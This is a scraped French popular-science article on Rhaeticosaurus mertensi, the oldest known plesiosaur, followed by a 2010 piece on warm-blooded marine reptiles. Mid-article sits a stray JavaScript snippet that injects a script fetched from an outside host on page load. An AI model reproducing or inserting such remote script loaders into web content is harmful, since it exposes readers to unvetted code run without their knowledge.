{"title": "Le plus ancien plesiosaure jamais decouvert !", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-12-20", "content": "Une equipe vient d'annoncer la decouverte des restes fossilises du plus vieux plesiosaure connu a ce jour. Cette nouvelle espece fascinante prouve, pour la premiere fois, que ces animaux existaient au Trias. A l'epoque des  dinosaures , vivaient d'autres animaux emblematiques : les  pterosaures , qui evoluaient dans l'air, et les plesiosaures (aussi appeles plesiosauriens), qui regnaient dans les eaux. Dans les deux cas, ces creatures n'etaient pas des  dinosaures . D'ailleurs, concernant les plesiosaures, il ne s'agissait meme pas de  reptiles  classiques ; c'est bien ce que signifie l'etymologie de << plesiosaure >> : le terme est construit a partir du grec  plesios,  << proche de >>, et  sauros , << lezard >>. Cela n'enleve rien a la fascination que l'Homme peut eprouver pour les plesiosaures. Il faut dire que, pendant longtemps, certains ont cru que l'animal aquatique n'avait pas disparu et qu'il etait a l'origine du fameux monstre du  Loch Ness , en Ecosse ! Malheureusement, il est facile de tordre le cou a cette legende, basee en particulier sur une photo censee montrer Nessie : son cou apparait courbe a la verticale comme celui d'un cygne, or, c'est une impossibilite mecanique pour un plesiosaure. Toujours est-il qu'une equipe vient d'annoncer la decouverte des restes fossilises du plus vieux plesiosaure connu. Ceux-ci ont ete analyses dans un article de  Science Advances   par les membres d'une equipe internationale de paleontologues des universites de Bonn (Allemagne), Osaka et Tokyo (Japon) et du laboratoire Mecadev (CNRS/Museum national d'histoire naturelle). Baptise  Rhaeticosaurus mertensi , ce plesiosaure vivait a la fin du Trias, il y a 201 a 208 millions d'annees. C'est une nouvelle espece et, surtout, cela prouve, pour la premiere fois, que ces animaux existaient au Trias. Les paleontologues Tanja Wintrich et Martin Sander examinant le fossile de  Rhaeticosaurus mertensi,  decouvert en 2013 par un particulier en Westphalie (Allemagne). (c) Yasuhisa Nakajima                                Un corps trapu, un cou court et une longue tete Comme tous les plesiosaures,  Rhaeticosaurus mertensi  avait un corps trapu avec quatre nageoires semblables permettant une sorte de vol subaquatique proche de celui des  tortues  de mer. La plupart des plesiosaures avaient une petite tete au bout d'un long cou ; pourtant, dans le cas des pliosaures, la tete etait longue et le cou court.  Rhaeticosaurus mertensi  possedait un cou relativement court et un crane long, ce qui le classe ainsi, selon les paleontologues, parmi les pliosaures ( Pliosauridae ). Ce plesiosaure etait donc, plus precisement, un pliosaure.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les os fossilises de l'animal aquatique ont ete scannes par microtomographie a rayons X. Les donnees obtenues ont permis de confirmer que, tout comme dans le cas d'autres plesiosaures deja connus, nous sommes en presence d'un animal a sang chaud. Ces donnees permettent aussi de conclure que le specimen retrouve devait etre un juvenile, age d'un peu plus d'un an (sa longueur est estimee a environ 2,3 metres), et que cette espece avait une croissance rapide. Pour en savoir plus Ichthyosaures, mosasaures et plesiosaures avaient le sang chaud Article de Laurent Sacco publie le 15/06/2010 Un groupe de chercheurs vient de montrer que les  ichthyosaures , plesiosaures et  mosasaures  du  Mesozoique  (entre -200 et -65 millions d'annees) etaient bien endothermes. Avoir le sang chaud permettait a ces grands predateurs d'adopter un comportement de chasseurs actifs malgre leurs tailles. Ces grands animaux, abondamment representes et qualifies de reptiles, qui glissaient dans les mers du  Jurassique  et du  Cretace , etaient tres eloignes des dinosaures, contrairement a une confusion tenace, et d'ailleurs double. Dans l'esprit du public, les dinosaures etaient tous de tres grands reptiles. Or, beaucoup etaient petits et d'ailleurs, le terme de reptile leur convient mal... Vue d'artiste (A. Beneteau) d'un ichthyosaure (Platypterygius). Les ichthyosaures presentaient les adaptions aquatiques les plus evidentes avec une anatomie rappelant celle d'un dauphin avec une nageoire caudale placee comme chez les poissons (orientee verticalement donc, et non horizontalement comme chez les cetaces). (c) PEPS (CNRS/universite de Lyon 1), INSU                               La decouverte de  dinosaures a plumes  au cours des annees 1990 a contraint biologistes et paleontologues a revoir la classification des  vertebres  et on considere aujourd'hui des dinosaures comme des vertebres diapsides, ce qui inclut les reptiles actuels (a l'exception des tortues) et les oiseaux. D'un point de vue  phylogenetique , les oiseaux sont des dinosaures. Dent d'ichthyosaure (Platypterygius), retrouvee dans les sediments de l'Albien d'Angleterre (barre = 1 cm). (c) A. Bernard, INSU                               En fait, le criteres essentiel qui fait d'un diapside un dinosaure est le fait que sa posture est erigee. L'animal se dresse sur des membres verticaux. C'est bien le cas d'un T-Rex mais pas celui d'un  crocodile  actuel. Pour tout de meme maintenir une difference entre oiseaux et dinosaures, on decrit les premiers comme des dinosaures  aviens  et des seconds comme des dinosaures non-aviens. Seuls ces derniers ont disparu, principalement sous l'effet de l'impact de la  meteorite  issue probablement de l' asteroide   298 Baptistina . Une grande discussion reste en suspens a propos des grands reptiles marins et des grands dinosaures du Mesozoique. Avaient-ils le sang froid ? Plus precisement, leurs temperatures internes etaient-elles fixees par celle de l'environnement ? Si la reponse est oui, ils ne possedaient donc pas de mecanismes internes de thermoregulation et etaient ectothermes, ce qui devait rendre difficile un comportement de predateur actif par exemple. Mais comment le savoir, s'agissant d'animaux disparus ? Il y a quelque temps, un groupe de chercheurs, parmi lesquels se trouvaient  Christophe Lecuyer  et  Eric Buffetaut , avaient utilise les rapports de deux  isotopes  de l' oxygene  pour tenter de faire la  lumiere  sur cette question epineuse. Pour eux, certains  dinosaures  du Cretace avaient bel et bien le sang chaud. Ces deux memes chercheurs viennent aujourd'hui de publier dans  Science  un nouvel article dans lequel ils examinent avec leurs collegues le cas des reptiles marins, plus precisement des ichthyosaures,  plesiosaures et mosasaures.  Reste dentaire de mosasaure (Prognathodon), une famille de Varanoides anguilliformes du Cretace superieur bien adaptes a la vie aquatique avec un corps allonge et des membres en forme de nageoires (barre = 1 cm). (c) A. Bernard, INSU                               Ce sont a nouveaux des isotopes stables de l'oxygene qui ont ete mis a contribution. Il faut savoir que dans le cas des  poissons  ectothermes, le rapport  18 O/ 16 O suit l'evolution de la temperature des oceans. Dans les series  fossiles  du Jurassique et du Cretace, les paleontologues observent que ce rapport fluctue de la meme maniere que la temperature de l'eau au fil des temps geologiques. Si certains des grands reptiles marins des mers et oceans de ces periodes geologiques etaient bien endothermes, on devrait trouver un rapport isotopique constant ou presque dans leurs os. Il a donc suffi aux chercheurs de mesurer ce rapport dans le phosphate contenu dans l' email  des dents fossilisees des reptiles marins vivant a la meme  latitude  et a la meme periode que certains poissons dont on possede les restes fossilises, pour repondre a la question initiale des paleontologues. Oui, mosasaures, ichthyosaures et plesiosaures etaient bien endothermes ! Les mesures indiquent que les  temperatures corporelles  de ces reptiles marins etaient comprises entre 35 et 39 degres (+-2degC), alors qu'ils nageaient dans des eaux dont les temperatures variaient entre 12 degres (+-2degC) et 36 degres (+-2degC). Ce qu'il faut retenir Les plesiosaures (aussi appeles plesiosauriens) sont des animaux du temps des dinosaures. Ils se deplacaient par << vol subaquatique >> et formaient le groupe le plus diversifie des oceans de l'epoque. Jusqu'a recemment, les scientifiques ne savaient pas tres bien quand ces animaux etaient apparus, mais la decouverte, en 2013, des restes fossilises d'une nouvelle espece montre que les plesiosaures existaient deja a la fin du Trias. L'etude des os de  Rhaeticosaurus mertensi  montre que celui-ci possedait, comme beaucoup de ses cousins, un sang chaud. ", "theme": "planete"}